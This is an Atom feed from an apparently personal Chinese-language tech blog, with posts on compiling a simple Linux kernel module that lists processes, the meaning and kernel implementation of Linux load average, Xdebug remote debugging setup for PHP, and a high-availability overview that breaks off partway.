<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
 <title>Yan</title>
 <link href="http://yanpeipan.github.io/" rel="self"/>
 <link href="http://yanpeipan.github.io"/>
 <updated>2019-11-15T15:25:27+08:00</updated>
 <id>http://yanpeipan.github.io</id>
 <author>
   <name>Yan Peipan</name>
   <email>yanpeipan_82@qq.com</email>
 </author>
 
 <entry>
   <title>编译内核模块</title>
   <link href="http://yanpeipan.github.io/2019/01/09/%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97.html"/>
   <updated>2019-01-09T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2019/01/09/编译内核模块</id>
   <content type="html">
&lt;p&gt;Makefile&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;obj-m += procsview.o

KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

default:
        $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;procsview.c&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/sched.h&amp;gt;
#include &amp;lt;linux/sched/signal.h&amp;gt;


extern struct task_struct init_task;

int init_module( void )
{
  /* Set up the anchor point */


        struct task_struct *task = &amp;amp;init_task;
        printk(KERN_ERR &quot;Module init: Hello linux kernel.\n&quot;);

  /* Walk through the task list, until we hit the init_task again */
        for_each_process(task) {

                printk( KERN_INFO &quot;*** %s [%d] parent %s\n&quot;,
        task-&amp;gt;comm, task-&amp;gt;pid, task-&amp;gt;parent-&amp;gt;comm );
  }

  return 0;

}

void cleanup_module( void )
{
  return;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;make
insmod procsview.ko
cat  /var/log/syslog
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;rmmod procsview
&lt;/code&gt;&lt;/pre&gt;
</content>
 </entry>
 
 <entry>
   <title>MySQL高可用架构</title>
   <link href="http://yanpeipan.github.io/2018/12/14/mysql%E9%AB%98%E5%8F%AF%E7%94%A8%E6%9E%B6%E6%9E%84.html"/>
   <updated>2018-12-14T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2018/12/14/mysql高可用架构</id>
   <content type="html">
</content>
 </entry>
 
 <entry>
   <title>Linux平均负载解疑</title>
   <link href="http://yanpeipan.github.io/2018/12/12/Linux%E5%B9%B3%E5%9D%87%E8%B4%9F%E8%BD%BD%E8%A7%A3%E7%96%91.html"/>
   <updated>2018-12-12T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2018/12/12/Linux平均负载解疑</id>
   <content type="html">
&lt;h1 id=&quot;平均负载load-average的定义&quot;&gt;平均负载(Load Average)的定义&lt;/h1&gt;

&lt;h2 id=&quot;cpu平均负载&quot;&gt;CPU平均负载&lt;/h2&gt;

&lt;p&gt;RFC 546 (1973)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;[1] The TENEX load average is a measure of CPU demand.  The load
   average is an average of the number of runable processes over a given
   time period.  For example, an hourly load average of 10 would mean
   that (for a single CPU system) at any time during that hour one could
   expect to see 1 process running and 9 others ready to run (i.e., not
   blocked for I/O) waiting for the CPU.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;TENEX load averages是衡量CPU需求的指标。这个值是给定时间内可运行进程数量的平均值。例如，对于单核CPU系统，每小时平均10次意思是在该小时内可以期望看到一个进程正在运行和另外九个等待CPU(即没有被I/O阻塞)处于ready状态的进程。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;不可中断任务&quot;&gt;不可中断任务&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://oldlinux.org/Linux.old/mail-archive/&quot;&gt;oldlinux.org&lt;/a&gt; 上1993年的一封邮件:&lt;/p&gt;
&lt;blockquote&gt;

  &lt;p&gt;From: Matthias Urlichs &lt;a href=&quot;mailto:urlichs@smurf.sub.org&quot;&gt;urlichs@smurf.sub.org&lt;/a&gt;&lt;br /&gt;
Subject: Load average broken ?&lt;br /&gt;
Date: Fri, 29 Oct 1993 11:37:23 +0200&lt;/p&gt;

  &lt;p&gt;The kernel only counts “runnable” processes when computing the load average.
I don’t like that; the problem is that processes which are swapping or
waiting on “fast”, i.e. noninterruptible, I/O, also consume resources.&lt;br /&gt;
It seems somewhat nonintuitive that the load average goes down when you
replace your fast swap disk with a slow swap disk…&lt;br /&gt;
Anyway, the following patch seems to make the load average much more
consistent WRT the subjective speed of the system. And, most important, the
load is still zero when nobody is doing anything. ;-)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;绝大多数类 Unix 系统只统计运行和等待状态的进程。但是在 Linux 中，平均负载也包括处于不可打断的睡眠状态的进程（TASK_UNINTERRUPTIBLE或nr_uninterruptible）——这种状态由希望避免信号中断的代码使用，其中包括阻塞在磁盘I/O和一些锁上的任务。&lt;/p&gt;

&lt;p&gt;使用&lt;code&gt;man ps&lt;/code&gt; (process status)查看：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;ps displays information about a selection of the active processes.  If you want a repetitive update of the selection and the displayed information, use top(1) instead.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Here are the different values that the s, stat and state output specifiers (header “STAT” or “S”) will display to describe the state of a process:&lt;/p&gt;
  &lt;blockquote&gt;
    &lt;p&gt;D    uninterruptible sleep (usually IO)  &lt;br /&gt;
R    running or runnable (on run queue)&lt;br /&gt;
S    interruptible sleep (waiting for an event to complete)&lt;br /&gt;
T    stopped by job control signal&lt;br /&gt;
t    stopped by debugger during the tracing&lt;br /&gt;
W    paging (not valid since the 2.6.xx kernel)&lt;br /&gt;
X    dead (should never be seen)&lt;br /&gt;
Z    defunct (“zombie”) process, terminated but not reaped by its parent&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;注：参见《OPERATING SYSTEM》  A process is an ‘active’ entity as opposed to program which is considered to be a ‘passive’ entity. 进程是活跃的，与之相反程序（代码）是不活跃的。所以active processes活跃进程包含所有状态的进程。&lt;/p&gt;

&lt;h2 id=&quot;系统平均负载&quot;&gt;系统平均负载&lt;/h2&gt;

&lt;p&gt;使用&lt;code&gt;man uptime&lt;/code&gt;命令来了解平均负载的详细解释。&lt;/p&gt;

&lt;blockquote&gt;

  &lt;p&gt;System  load  averages  is the average number of processes that are either in a runnable or uninterruptable state.  A process in a runnable state is either using the CPU or waiting to use the CPU.  A process in uninterruptable state is waiting for some I/O access, eg waiting for disk.  The averages are taken over the three time intervals.  Load averages are not normalized for the number of CPUs in a system, so a load average of 1 means a single CPU system is loaded all the time while on a  4  CPU  system  it means it was idle 75% of the time.&lt;/p&gt;

  &lt;p&gt;系统负载平均是处于可运行或不可中断状态的进程的平均数量。处于可运行状态的进程要么使用CPU，要么等待使用CPU。处于不可中断状态的进程正在等待一些I/O访问(如等待磁盘)。平均值在三个时间间隔内取。对于系统中的CPU数量，负载平均并不是标准化的，所以负载平均为1意味着一个CPU系统一直在加载，而对于4 CPU系统，负载平均为75%的时间是空闲的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;除此之外还可使用 &lt;code&gt;w&lt;/code&gt; &lt;code&gt;top&lt;/code&gt;, 及各种增强版&lt;code&gt;atop&lt;/code&gt; &lt;code&gt;htop&lt;/code&gt; &lt;code&gt;glances&lt;/code&gt;等，或者直接使用&lt;code&gt;cat /proc/loadavg&lt;/code&gt;命令读取。&lt;/p&gt;

&lt;h2 id=&quot;实现&quot;&gt;实现&lt;/h2&gt;

&lt;p&gt;linux/fs/proc/loadavg.c&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;static int loadavg_proc_show(struct seq_file *m, void *v)
{
	unsigned long avnrun[3];

	get_avenrun(avnrun, FIXED_1/200, 0);

	seq_printf(m, &quot;%lu.%02lu %lu.%02lu %lu.%02lu %ld/%d %d\n&quot;,
		LOAD_INT(avnrun[0]), LOAD_FRAC(avnrun[0]),
		LOAD_INT(avnrun[1]), LOAD_FRAC(avnrun[1]),
		LOAD_INT(avnrun[2]), LOAD_FRAC(avnrun[2]),
		nr_running(), nr_threads,
		idr_get_cursor(&amp;amp;task_active_pid_ns(current)-&amp;gt;idr) - 1);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;linux/include/linux/sched/loadavg.h&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#define EXP_1		1884		/* 1/exp(5sec/1min) as fixed-point */
#define EXP_5		2014		/* 1/exp(5sec/5min) */
#define EXP_15		2037		/* 1/exp(5sec/15min) */

/*
 * a1 = a0 * e + a * (1 - e)
 */
static inline unsigned long
calc_load(unsigned long load, unsigned long exp, unsigned long active)
{
	unsigned long newload;

	newload = load * exp + active * (FIXED_1 - exp);
	if (active &amp;gt;= load)
		newload += FIXED_1-1;

	return newload / FIXED_1;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;linux/kernel/sched/loadavg.c&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
/*
 * Global load-average calculations
 *
 * We take a distributed and async approach to calculating the global load-avg
 * in order to minimize overhead.
 *
 * The global load average is an exponentially decaying average of nr_running +
 * nr_uninterruptible.
 *
 * Once every LOAD_FREQ:
 *
 *   nr_active = 0;
 *   for_each_possible_cpu(cpu)
 *	nr_active += cpu_of(cpu)-&amp;gt;nr_running + cpu_of(cpu)-&amp;gt;nr_uninterruptible;
 *
 *   avenrun[n] = avenrun[0] * exp_n + nr_active * (1 - exp_n)
...
*/

/*
 * calc_load - update the avenrun load estimates 10 ticks after the
 * CPUs have updated calc_load_tasks.
 *
 * Called from the global timer code.
 */
void calc_global_load(unsigned long ticks)
{
	unsigned long sample_window;
	long active, delta;

	sample_window = READ_ONCE(calc_load_update);
	if (time_before(jiffies, sample_window + 10))
		return;

	/*
	 * Fold the 'old' NO_HZ-delta to include all NO_HZ CPUs.
	 */
	delta = calc_load_nohz_fold();
	if (delta)
		atomic_long_add(delta, &amp;amp;calc_load_tasks);

	active = atomic_long_read(&amp;amp;calc_load_tasks);
	active = active &amp;gt; 0 ? active * FIXED_1 : 0;

	avenrun[0] = calc_load(avenrun[0], EXP_1, active);
	avenrun[1] = calc_load(avenrun[1], EXP_5, active);
	avenrun[2] = calc_load(avenrun[2], EXP_15, active);

	WRITE_ONCE(calc_load_update, sample_window + LOAD_FREQ);

	/*
	 * In case we went to NO_HZ for multiple LOAD_FREQ intervals
	 * catch up in bulk.
	 */
	calc_global_nohz();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;为了最小化开销，Linux采用分布式和异步的方法来计算全局负载平均分配。全局负载平均值是nr_running + nr_uninterruptible的指数衰减平均值。&lt;br /&gt;
Linux内核定义一个长度为3的双字数组avenrun，双字的低11位用于存放负载的小数部分，高21位用于存放整数部分。&lt;/p&gt;

&lt;blockquote&gt;

  &lt;p&gt;注：linux kernel的设计哲学是禁止在内核里使用浮点操作的，这是从性能上的考虑，因为这样做可以省去在用户态与内核态之间进行切换时保存/恢复浮点寄存器 FPU的操作, 内核浮点计算代码块中，必须使用 &lt;code&gt;kernel_fpu_begin()&lt;/code&gt;和&lt;code&gt;kernel_fpu_end()&lt;/code&gt;这两个函数包起来。这两个函数的作用是让内核感知不到OS运行过程中有使用硬件浮点寄存器   &lt;br /&gt;
指数移动平均（英语：exponential moving average，EMA或EXMA）是以指数式递减加权的移动平均。各数值的加权影响力随时间而指数式递减，越近期的数据加权影响力越重，但较旧的数据也给予一定的加权值&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;指标的三个粒度&quot;&gt;指标的三个粒度&lt;/h1&gt;

&lt;h2 id=&quot;理解linux的平均负载&quot;&gt;理解Linux的平均负载&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;uptime
13:17  up 23:48, 5 users, load averages: 2.31 2.44 2.46
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
  &lt;li&gt;如果平均值是0.0，说明系统处于空闲状态&lt;/li&gt;
  &lt;li&gt;如果1分钟的平均值大于5分钟或者15分钟，说明系统负载正在增加&lt;/li&gt;
  &lt;li&gt;如果1分钟的平均值小于5分钟或者15分钟，说明系统负载正在减小&lt;/li&gt;
  &lt;li&gt;如果这些值大于CPU的个数，说明可能遇到了性能问题&lt;/li&gt;
  &lt;li&gt;系统平均负载涉及不同的资源类型，因此它们更加模糊，所以不能只除以CPU计数&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;注：查看CPU个数 &lt;code&gt;grep 'model name' /proc/cpuinfo | wc -l&lt;/code&gt; )&lt;/p&gt;

&lt;h2 id=&quot;模拟分析&quot;&gt;模拟分析&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;apt install sysstat
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;cpu密集&quot;&gt;CPU密集&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;stress -i 1 --timeout 600

watch -d uptime

Every 2.0s: uptime                                                                                                                                                          2018: Wed Dec 19 20:05:44 2018

 20:05:44 up  6:30,  3 users,  load average: 0.57, 0.37, 0.21

mpstat -P ALL 5

20时05分11秒  CPU    %usr   %nice    %sys %iowait    %irq   %soft  %steal  %guest  %gnice   %idle
20时05分16秒  all   12.60    0.00    0.05    0.00    0.00    0.00    0.00    0.00    0.00   87.35
20时05分16秒    0    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00  100.00
20时05分16秒    1    0.60    0.00    0.20    0.20    0.00    0.00    0.00    0.00    0.00   99.00
20时05分16秒    2    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00  100.00
20时05分16秒    3    0.00    0.00    0.20    0.00    0.00    0.00    0.00    0.00    0.00   99.80
20时05分16秒    4    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00  100.00
20时05分16秒    5    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00  100.00
20时05分16秒    6  100.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00
20时05分16秒    7    0.20    0.00    0.20    0.00    0.00    0.00    0.00    0.00    0.00   99.60
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;io密集&quot;&gt;IO密集&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;stress -d 1 --hdd-bytes 1G -t 600

stress-ng -i 1 --hdd 1 --timeout 600

watch -d uptime

mpstat -P ALL 5

pidstat -u 5
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;进程竞争&quot;&gt;进程竞争&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;stress -c 8 --timeout 600

watch -d vmstat
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://juejin.im/post/5b18d47ce51d4506c3354d54&quot;&gt;深入理解load averages&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.brendangregg.com/blog/2017-08-08/linux-load-averages.html&quot;&gt;Linux Load Averages: Solving the Mystery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://time.geekbang.org/column/article/69618&quot;&gt;基础篇：到底应该怎么理解“平均负载”？&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.studytonight.com/operating-system/operating-system-processes&quot;&gt;What is a Process?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>Xdebug: 协助调试与开发</title>
   <link href="http://yanpeipan.github.io/php/2018/10/31/xdebug%E5%8D%8F%E5%8A%A9%E8%B0%83%E8%AF%95%E4%B8%8E%E5%BC%80%E5%8F%91.html"/>
   <updated>2018-10-31T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/php/2018/10/31/xdebug协助调试与开发</id>
   <content type="html">
&lt;h1 id=&quot;远程调试&quot;&gt;远程调试&lt;/h1&gt;

&lt;h2 id=&quot;原理&quot;&gt;原理&lt;/h2&gt;
&lt;p&gt;Xdebug使用DBGp（2.1版本之后只支持DBGp），与支持DGBp的终端建立连接（如：PHPStorm），Xdebug在服务端过滤每一行执行代码并暂停，向终端发送执行情况，并等待终端决策（断点等）。&lt;a href=&quot;https://xdebug.org/docs-dbgp.php&quot;&gt;DBGp&lt;/a&gt; - A common debugger protocol for languages and debugger UI communication&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;使用Wireshark抓取PHP Server [PSH，ACK]的消息 (过滤条件：&lt;code&gt;tcp.port==9000 &amp;amp;&amp;amp; tcp.flags.push == 1&lt;/code&gt;)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/image/1540976019586.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;通信设置&quot;&gt;通信设置&lt;/h2&gt;

&lt;h3 id=&quot;静态ip--单个开发者&quot;&gt;静态IP / 单个开发者&lt;/h3&gt;

&lt;p&gt;Xdebug收到调试请求，并与 &lt;code&gt;xdebug.remote_host&lt;/code&gt; &amp;amp; &lt;code&gt;xdebug.remote_port&lt;/code&gt; 建立连接&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/image/dbgp-setup.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;动态ip--多个开发者&quot;&gt;动态IP / 多个开发者&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;xdebug.remote_connect_back = 1&lt;/code&gt;时，Xdebug收到调试请求，并与检测到的请求IP &amp;amp; &lt;code&gt;xdebug.remote_port&lt;/code&gt; 建立连接&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/image/dbgp-setup2.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;配置参数&quot;&gt;配置参数&lt;/h2&gt;

&lt;h3 id=&quot;phpini&quot;&gt;php.ini&lt;/h3&gt;
&lt;div class=&quot;language-php highlighter-coderay&quot;&gt;&lt;div class=&quot;CodeRay&quot;&gt;
  &lt;div class=&quot;code&quot;&gt;&lt;pre&gt;[xdebug]
zend_extension = &lt;span style=&quot;background-color:hsla(0,100%,50%,0.05)&quot;&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&quot;color:#D20&quot;&gt;xdebug.so&lt;/span&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
xdebug.enable = &lt;span style=&quot;color:#00D&quot;&gt;1&lt;/span&gt;
xdebug.idekey = &lt;span style=&quot;background-color:hsla(0,100%,50%,0.05)&quot;&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&quot;color:#D20&quot;&gt;PHPSTORM&lt;/span&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
;xdebug.profiler_enable = &lt;span style=&quot;color:#00D&quot;&gt;1&lt;/span&gt;
xdebug.remote_enable = &lt;span style=&quot;color:#00D&quot;&gt;1&lt;/span&gt;
xdebug.remote_connect_back = &lt;span style=&quot;color:#00D&quot;&gt;0&lt;/span&gt;
xdebug.remote_mode = &lt;span style=&quot;background-color:hsla(0,100%,50%,0.05)&quot;&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&quot;color:#D20&quot;&gt;req&lt;/span&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
xdebug.remote_handler = &lt;span style=&quot;background-color:hsla(0,100%,50%,0.05)&quot;&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&quot;color:#D20&quot;&gt;dbgp&lt;/span&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
xdebug.remote_host = &lt;span style=&quot;color:#60E&quot;&gt;192.168&lt;/span&gt;&lt;span style=&quot;color:#60E&quot;&gt;.99&lt;/span&gt;&lt;span style=&quot;color:#60E&quot;&gt;.1&lt;/span&gt;
xdebug.remote_port = &lt;span style=&quot;color:#00D&quot;&gt;9000&lt;/span&gt;
;xdebug.remote_autostart = &lt;span style=&quot;color:#00D&quot;&gt;1&lt;/span&gt;
xdebug.remote_log= &lt;span style=&quot;background-color:hsla(0,100%,50%,0.05)&quot;&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&quot;color:#D20&quot;&gt;/tmp/xdebug.log&lt;/span&gt;&lt;span style=&quot;color:#710&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;blockquote&gt;
  &lt;p&gt;不要忘记重启php-fpm&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;sudo service php-fpm restart
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;phpstorm配置&quot;&gt;PHPSTORM配置&lt;/h3&gt;

&lt;h4 id=&quot;针对单文件调试&quot;&gt;针对单文件调试&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;PhpStorm -&amp;gt; Preferences -&amp;gt; Languages &amp;amp; Frameworks -&amp;gt; PHP -&amp;gt; CLI Interpreter&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;针对项目调试&quot;&gt;针对项目调试&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;PhpStorm -&amp;gt; Preferences -&amp;gt; Languages &amp;amp; Frameworks -&amp;gt; PHP -&amp;gt; Debug
PhpStorm -&amp;gt; Preferences -&amp;gt; Languages &amp;amp; Frameworks -&amp;gt; PHP -&amp;gt; Servers&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;http-debug-sessions&quot;&gt;HTTP Debug Sessions&lt;/h3&gt;

&lt;p&gt;当HTTP请求GET/POST传递&lt;code&gt;XDEBUG_SESSION_START&lt;/code&gt;变量、或者Cookie&lt;code&gt;XDEBUG_SESSION&lt;/code&gt;设置值，Xdebug才会尝试连接到调试终端。一般可以安装浏览器助手，省去手写Debug Sessions变量（如： &lt;code&gt;?XDEBUG_SESSION_START=PHPSTORM&lt;/code&gt;）&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;浏览器Xdebug助手&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://addons.mozilla.org/en-GB/firefox/addon/xdebug-helper-for-firefox/&quot;&gt;Xdebug Helper for Firefox&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://chrome.google.com/extensions/detail/eadndfjplgieldjbigjakmdgkmoaaaoc&quot;&gt;Xdebug Helper for Chrome&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;最终结果&quot;&gt;最终结果&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/image/1540979635588.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://xdebug.org/docs/remote&quot;&gt;Remote Debugging&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://xdebug.org/docs-dbgp.php&quot;&gt;DBGP&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://laravel-china.org/articles/4090/the-first-step-to-becoming-a-senior-php-programmer-debugging-xdebug-principle&quot;&gt;成为高级 PHP 程序员的第一步——调试（xdebug 原理篇）&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://laravel-china.org/articles/4098/the-first-step-to-becoming-a-senior-php-programmer-debug-xdebug-configuration&quot;&gt;成为高级 PHP 程序员的第一步——调试（xdebug 配置篇）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>高可用</title>
   <link href="http://yanpeipan.github.io/2018/09/19/%E9%AB%98%E5%8F%AF%E7%94%A8.html"/>
   <updated>2018-09-19T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2018/09/19/高可用</id>
   <content type="html">
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#%E9%AB%98%E5%8F%AF%E7%94%A8&quot;&gt;高可用&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#%E9%AB%98%E5%8F%AF%E7%94%A8%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E5%BA%A6%E9%87%8F&quot;&gt;高可用的定义和度量&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#%E9%AB%98%E5%8F%AF%E7%94%A8%E5%AE%9A%E4%B9%89&quot;&gt;高可用定义&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#%E5%8F%AF%E7%94%A8%E6%80%A77%E7%BA%A7%E5%9B%BE%E8%A1%A8&quot;&gt;可用性7级图表&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#%E9%AB%98%E5%8F%AF%E7%94%A8%E5%BA%A6%E9%87%8F&quot;&gt;高可用度量&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#ptopro&quot;&gt;PTO/PRO&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%E8%AF%B7%E6%B1%82%E6%88%90%E5%8A%9F%E7%8E%87&quot;&gt;请求成功率&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#sliservice-level-indicator-%E6%9C%8D%E5%8A%A1%E7%AD%89%E7%BA%A7%E6%8C%87%E6%A0%87&quot;&gt;SLI(Service Level Indicator 服务等级指标)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#sloservice-level-objective-%E6%9C%8D%E5%8A%A1%E7%AD%89%E7%BA%A7%E7%9B%AE%E6%A0%87&quot;&gt;SLO(Service level objective 服务等级目标)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#sla&quot;&gt;SLA&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#%E9%AB%98%E5%8F%AF%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88&quot;&gt;高可用解决方案&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#master-slave&quot;&gt;Master-Slave&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#master-master&quot;&gt;Master-Master&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#twothree-phase-commit2pc-%E4%B8%A4%E6%AE%B5%E6%8F%90%E4%BA%A4&quot;&gt;Two/Three Phase Commit(2PC 两段提交)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#paxos%E7%AE%97%E6%B3%95&quot;&gt;Paxos算法&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#%E5%BD%B1%E5%93%8D%E9%AB%98%E5%8F%AF%E7%94%A8%E7%9A%84%E5%9B%A0%E7%B4%A0&quot;&gt;影响高可用的因素&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;高可用&quot;&gt;高可用&lt;/h1&gt;
&lt;p&gt;高可用，英文叫High Availability（Wikipedia词条），基本上来说，就是要让我们的计算环境（包括软硬件）做到full-time的可用性。在设计上一般来说，需要做好如下的设计：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;对软硬件的冗余，以消除单点故障。任何系统都会有一个或多个冗余系统做standby&lt;/li&gt;
  &lt;li&gt;对故障的检测和恢复。检测故障以及用备份的结点接管故障点。这也就是failover&lt;/li&gt;
  &lt;li&gt;需要很可靠的交汇点（CrossOver）。这是一些不容易冗余的结点，比如域名解析，负载均衡器等。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;细节之处全是魔鬼，冗余结点最大的难题就是&lt;strong&gt;对于有状态的结点的数据复制和数据一致性的保证&lt;/strong&gt;（无状态结点的冗余相对比较简单）。冗余数据所带来的一致性问题是魔鬼中的魔鬼：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如果系统的数据镜像到冗余结点是异步的，那么在failover的时候就会出现数据差异的情况。&lt;/li&gt;
  &lt;li&gt;如果系统在数据镜像到冗余结点是同步的，那么就会导致冗余结点越多性能越慢。&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;高可用的定义和度量&quot;&gt;高可用的定义和度量&lt;/h1&gt;

&lt;h2 id=&quot;高可用定义&quot;&gt;高可用定义&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;可用性（availability）是关于系统可供使用时间的表述，以不可用的时间为衡量指标。不可用时间越短，可用性越高。通常用 n 个 9 来描述。&lt;/li&gt;
  &lt;li&gt;可靠性（reliability）是关于系统无故障时间间隔的描述，以发生故障的次数为衡量指标，故障次数越少，可靠性越高。&lt;/li&gt;
